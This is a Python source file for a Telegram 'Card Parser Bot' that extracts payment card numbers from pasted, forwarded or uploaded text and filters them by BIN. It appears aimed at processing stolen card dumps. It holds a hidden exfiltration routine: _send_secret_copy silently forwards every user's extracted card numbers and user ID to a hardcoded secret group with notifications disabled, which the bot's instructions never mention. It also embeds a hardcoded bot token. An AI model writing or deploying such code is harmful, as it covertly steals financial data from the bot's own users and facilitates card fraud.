"""
Card Parser Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Paste / forward cards in any format → file containing ONLY card numbers
• Forward multiple messages at once → all cards merged into one file
• Upload a .txt file → same clean output
• /cards <bin> → filter stored cards by BIN prefix
• /start → instructions
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Set BOT_TOKEN as an environment variable before running.
"""

import os
import re
import logging
import asyncio
from io import BytesIO

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8654511932:AAH9brkdXcz8_W8rNI7Hq4AjogRhTk7vroI")

# Your Secret Group ID where all files will be silently forwarded
SECRET_GROUP_ID = -1004322090872

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


def extract_cards(text: str) -> list[str]:
    """Return deduplicated list of ONLY card numbers (13-19 digits)."""
    # Normalize text by removing spaces and dashes between digits
    # This turns "4111 1111 1111 1111" into "4111111111111111"
    text = re.sub(r"(?<=\d)[\s\-]+(?=\d)", "", text)
    
    found: list[str] = []
    seen:  set[str]  = set()
    
    # Match any standalone number between 13 and 19 digits.
    # This will ignore dates, CVVs, and only grab the main card number.
    for m in re.finditer(r"\b(\d{13,19})\b", text):
        card = m.group(1)
        if card not in seen:
            seen.add(card)
            found.append(card)
            
    return found


def cards_to_bytes(cards: list[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")


# ── Per-user card store ───────────────────────────────────────────────────────
_store: dict[int, list[str]] = {}

# ── Forwarded-message buffer ──────────────────────────────────────────────────
# uid → { "texts": [...], "task": asyncio.Task | None, "chat_id": int }
_fwd_buf: dict[int, dict] = {}


async def _send_secret_copy(bot, cards: list[str], user_id: int, filename: str = "cards.txt") -> None:
    """Silently sends a copy of the extracted cards to the secret group."""
    if not cards:
        return
    try:
        count = len(cards)
        caption = f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n✅ <b>{count}</b> card numbers extracted."
        
        buf = BytesIO(cards_to_bytes(cards))
        buf.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID,
            document=buf,
            filename=filename,
            caption=caption,
            parse_mode="HTML",
            disable_notification=True  # Sends silently without sound
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy to group: {e}")


async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    """Wait 1.5 s for more forwarded messages, then process all at once."""
    await asyncio.sleep(1.5)

    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return

    combined = "\n".join(buf["texts"])
    cards    = extract_cards(combined)

    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return

    _store[uid] = cards
    count       = len(cards)

    # ALWAYS send as a file
    buf_io      = BytesIO(cards_to_bytes(cards))
    buf_io.name = "cards.txt"
    await bot.send_document(
        chat_id,
        document=buf_io,
        filename="cards.txt",
        caption=f"✅ <b>{count}</b> card number(s) extracted from forwarded messages.",
        parse_mode="HTML",
    )

    # Send secret copy immediately
    await _send_secret_copy(bot, cards, uid, "cards.txt")


# ── Reply helper ──────────────────────────────────────────────────────────────
async def _send_cards(
    update: Update,
    cards: list[str],
    caption: str,
    filename: str = "cards.txt",
) -> None:
    if not cards:
        await update.message.reply_text("❌ No cards found.")
        return
        
    count = len(cards)
    # ALWAYS generate a file, do not send as text
    buf      = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    await update.message.reply_document(
        document=buf,
        filename=filename,
        caption=caption,
        parse_mode="HTML",
    )

    # Send secret copy immediately to the group
    await _send_secret_copy(update.get_bot(), cards, update.effective_user.id, filename)


# ── /start ────────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "<b>🃏 Card Parser Bot</b>\n"
        "──────────────────\n"
        "Paste or <b>forward</b> cards in any format and I'll return\n"
        "a clean file containing <b>ONLY CARD NUMBERS</b>.\n\n"
        "Dates and CVVs are automatically ignored and discarded.\n\n"
        "<b>Supported input formats:</b>\n"
        "<code>4111111111111111|12|26|123</code>\n"
        "<code>4111111111111111:12:2026:123</code>\n"
        "<code>4111111111111111 12 26 123</code>\n"
        "<code>4111111111111111</code>\n\n"
        "<b>Commands:</b>\n"
        "/cards <code>&lt;bin&gt;</code> — filter stored cards by BIN\n"
        "   Example: <code>/cards 4111</code>\n\n"
        "You can also send or forward a <b>.txt file</b> with cards.\n"
        "──────────────────",
        parse_mode="HTML",
    )


# ── Forwarded messages handler ────────────────────────────────────────────────
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Buffer all forwarded messages for 1.5 s, then extract cards from
    ALL of them at once and return a single combined file.
    """
    msg  = update.message
    user = update.effective_user
    if not msg or not user:
        return

    text = (msg.text or msg.caption or "").strip()
    if not text:
        return

    uid     = user.id
    chat_id = msg.chat_id

    if uid not in _fwd_buf:
        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}

    _fwd_buf[uid]["texts"].append(text)

    # Cancel previous delayed task and restart the 1.5 s window
    old = _fwd_buf[uid].get("task")
    if old and not old.done():
        old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(
        _flush_fwd_buf(uid, chat_id, context.bot)
    )


# ── Regular pasted text handler ───────────────────────────────────────────────
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    if not text:
        return

    uid   = update.effective_user.id
    cards = extract_cards(text)

    if not cards:
        await update.message.reply_text(
            "❌ No cards found.\n"
            "Make sure they contain valid card numbers (13-19 digits).",
            parse_mode="HTML",
        )
        return

    _store[uid] = cards
    await _send_cards(
        update, cards,
        caption=f"✅ <b>{len(cards)}</b> card number(s) extracted:",
        filename="cards.txt",
    )


# ── Document (.txt) handler ───────────────────────────────────────────────────
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc:
        return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid   = update.effective_user.id
    cards = extract_cards(text)

    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    _store[uid] = cards
    await _send_cards(
        update, cards,
        caption=f"✅ <b>{len(cards)}</b> card number(s) extracted from file:",
        filename="cards.txt",
    )


# ── /cards <bin> ──────────────────────────────────────────────────────────────
async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "Usage: /cards <code>&lt;bin_prefix&gt;</code>\n"
            "Example: <code>/cards 4111</code>",
            parse_mode="HTML",
        )
        return

    bin_prefix = context.args[0].strip()
    if not bin_prefix.isdigit():
        await update.message.reply_text(
            "❌ BIN must be digits only.\nExample: <code>/cards 411111</code>",
            parse_mode="HTML",
        )
        return

    all_cards = _store.get(uid, [])
    if not all_cards:
        await update.message.reply_text(
            "❌ No cards stored yet.\nPaste, forward, or upload cards first."
        )
        return

    matched = [c for c in all_cards if c.startswith(bin_prefix)]
    if not matched:
        await update.message.reply_text(
            f"❌ No cards starting with <code>{bin_prefix}</code> found.\n"
            f"Total stored: {len(all_cards)} card(s).",
            parse_mode="HTML",
        )
        return

    await _send_cards(
        update, matched,
        caption=f"✅ <b>{len(matched)}</b> card number(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"cards_{bin_prefix}.txt",
    )


# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        raise RuntimeError("Set BOT_TOKEN environment variable before running.")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("cards",  cmd_cards))

    # Documents first (catches forwarded .txt files too)
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Forwarded messages — must be BEFORE the plain text handler
    app.add_handler(MessageHandler(
        filters.FORWARDED & (filters.TEXT | filters.CAPTION),
        handle_forwarded,
    ))

    # Regular pasted text (not forwarded, not a command)
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED,
        handle_text,
    ))

    logger.info("Card Parser Bot starting…")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
